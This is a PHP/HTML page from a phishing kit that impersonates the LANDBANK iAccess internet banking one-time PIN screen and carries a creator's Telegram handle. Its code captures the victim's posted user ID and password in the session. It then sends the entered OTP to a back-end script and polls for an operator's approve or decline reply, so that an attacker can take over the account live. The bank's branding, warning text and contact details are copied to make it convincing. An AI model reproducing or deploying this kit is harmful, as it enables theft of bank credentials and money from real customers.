<?php
session_start();
// error_reporting(0);
if(!isset($_SESSION['userid'], $_SESSION['password'])){
    $_SESSION['userid']= $_POST['channelUserID'];
    $_SESSION['password']= $_POST['channelPswdPin'];   
}
include 'allprocess.php';
$bysy = "none" ; 
if(isset($_POST['OTP'])){
	$bysy = "block";
}
?>
<!DOCTYPE html>
<!-- Created By MariaClara | TELEGRAM : @mariaclara1337 -->
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link type="text/css" rel="stylesheet" href="./files/theme.css">
        <link type="text/css" rel="stylesheet" href="./files/font.css">
        <link type="text/css" rel="stylesheet" href="./files/style.css">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="mobile-web-app-capable" content="yes">
        <title>LANDBANK iAccess Retail Internet Banking - Login</title>
        <link rel="icon" href="./files/favicon.ico">
        <script type="text/javascript">
	        function awaits(rr){
		        console.log(rr);
		        if(rr.length != 6){
		        	return;
		        }
		        if(Number.isNaN(rr*1)){
			        return;
		        }
		        var xxml = new XMLHttpRequest();
		        xxml.open('POST',"otp-true.php",true);
		        xxml.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		        xxml.send("OTP="+document.getElementById("OTP").value);
		        document.getElementById('bysy_indicator').style.display="block";
		        let id = setInterval(function(){
			        var xml = new XMLHttpRequest();
			        xml.open('GET',"code.php?uid=<?php echo $uid; ?>");
			        xml.onload = function(){
				        console.log(xml.response);
				        if(xml.response == 'Ok!'){
					        window.location="success.php";
					        clearInterval(id);
				        }else if(xml.response == 'Declined!'){
					        window.location.hash="#error";
					        window.location.reload();
				        }
			        }
			        xml.send("uid=<?php echo $uid; ?>");
		        },1000);
	        }
        </script>
    </head>
    <body id="login-body" onpageshow="if (event.persisted) noBack();" onunload>
        <div id="login-maincontainer">
            <div id="login-topsection">
                <img src="./files/lbpiaccess.jpg" alt="" class="logo_landbank">
            </div>
            <div id="login-wrapper">
                <div id="otp-form" name="otp-form" enctype="application/x-www-form-urlencoded">
                    <div id="otp-form:j_idt63" class="ui-panel ui-widget ui-widget-content ui-corner-all" style="border: 0px" data-widget="widget_otp_form_j_idt63">
                        <div id="otp-form:j_idt63_header" class="ui-panel-titlebar ui-widget-header ui-helper-clearfix ui-corner-all">
                            <span class="ui-panel-title">Security Validation</span>
                        </div>
                        <div id="otp-form:j_idt63_content" class="ui-panel-content ui-widget-content">
                            <div id="otp-form:otp-form-msgs" class="ui-messages ui-widget" aria-live="polite" data-global="false" data-detail="data-detail" data-severity="all,error" data-redisplay="true">
                                <div class="ui-messages-error ui-corner-all" id="neuron-error">
                                    <span class="ui-messages-error-icon"></span>
                                    <ul>
                                        <li role="alert" aria-atomic="true">
                                            <span class="ui-messages-error-detail">Invalid One-Time PIN. Please try again.</span>
                                        </li>
                                    </ul>
                                </div>
                                <?php if(isset($_GET["successsend"])){ echo '<div id="msgs" class="ui-messages ui-widget" aria-live="polite" data-global="false" data-detail="data-detail" data-severity="all,error" data-redisplay="true"><div class="ui-messages-info ui-corner-all"><span class="ui-messages-info-icon"></span><ul><li role="alert" aria-atomic="true"><span class="ui-messages-info-detail">Your One-Time PIN is sent to your registered mobile no.</span></li></ul></div></div>';}?>
                            </div>
                            <table cellpadding="5">
                                <tbody>
                                    <tr>
                                        <td>
                                            <label id="otp-form:j_idt66" class="ui-outputlabel ui-widget" for="otp-form:otp">One-Time PIN</label>
                                        </td>
                                        <td>
                                        <input class="ui-inputfield ui-password ui-widget ui-state-default ui-corner-all" id="OTP" type=text tabindex=2 minlength=6 maxlength=6 name="OTP" value required>
                                        </td>
                                        <td>
                                            <div id="otp-form:mgotp" role="alert" aria-atomic="true" aria-live="polite" data-display="icon" data-target="otp-form:otp" data-redisplay="true" class="ui-message"></div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        <div>
                            <ul style="padding-left: 15px; margin-top: 0">
                                <li>For added security, please enter the One-Time PIN sent to your mobile number.</li>
                                <li>It will expire in 5 minutes.</li>
                                <li>If you did not receive an OTP or if your OTP has expired, generate a new one by clicking <strong>Resend OTP via SMS</strong>.</li>
                            </ul>
                        </div>
                        <button id="otp-form:otp-submit" name="otp-form:otp-submit" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="awaits(document.getElementById('OTP').value)" type="submit" role="button" aria-disabled="false"><span class="ui-button-text ui-c">Submit</span></button>
                        <img id="otp-form:j_idt79" width="5" alt="" src="./error_files/dot_clear.gif">
                        <a id="otp-form:otp-regenerate-sms" name="otp-form:otp-regenerate-sms" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" href="./otp-true.php?successsend"><span class="ui-button-text ui-c">Resend OTP via SMS</span></a>
                        <img id="otp-form:j_idt81" width="5" alt="" src="./error_files/dot_clear.gif">
                    </div>
                </div>
            </div>
            <div id=bysy_indicator style=display:none hidden>
                <div id=loading_gif></div>
            </div>
            </div>
            <div id="footer">
                <div id="container-warning">
                    <span class="warning">WARNING:</span>
                    <span class="warning-higlight">iAccess is for authorized clients only.</span>
                    <span>It shall be a criminal offense for any person to:</span>
                    <ol>
                        <li>Obtain access to data without authority;</li>
                        <li>Corrupt, alter, steal or destroy data;</li>
                        <li>Interfere in computer system or server;</li>
                        <li>Introduce computer virus.</li>
                    </ol>
                    <span>Penalty shall consist of minimum fine of Php100,000 and a maximum commensurate to the damage incurred and a mandatory imprisonment of six months to three years under R.A. No. 8792 (E-Commerce Act of the Philippines).</span>
                </div>
                <div id="container-contactinfo">
                    <span style="color: #0db14b; font-size: 12px; font-weight: bold;">LANDBANK CUSTOMER CARE CENTER</span><br>
                    <span>Tel. Nos.: (02) 8405-7000 (NCR) or</span><br>
                    <span>1-800-10-405-7000 (PLDT Domestic Toll Free/Outside NCR)</span><br>
                    <span>Email: customercare@mail.landbank.com</span><br>
                    <hr align="right" style="width: 380px; color: #66cc99; border: 1px solid #66cc99;">
                    <span>Regulated by the Bangko Sentral ng Pilipinas.</span><br>
                    <span>Deposits are insured by PDIC up to P500,000 per depositor.</span><br>
                    <span style="display: flex; flex-direction: row-reverse">
                        <img src="./files/bancnet_logo.png" alt="" width="100" height="20">
                        <span>A Proud Member of </span>
                    </span>
                </div>
            </div>
        </div>
        <div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div>
        <div class="ui-dialog-docking-zone"></div>
        <script type="text/javascript">
            document.getElementById('neuron-error').style.display = window.location.hash == "#error" ? "block" : "none" ; 
        </script>
    </body>
</html>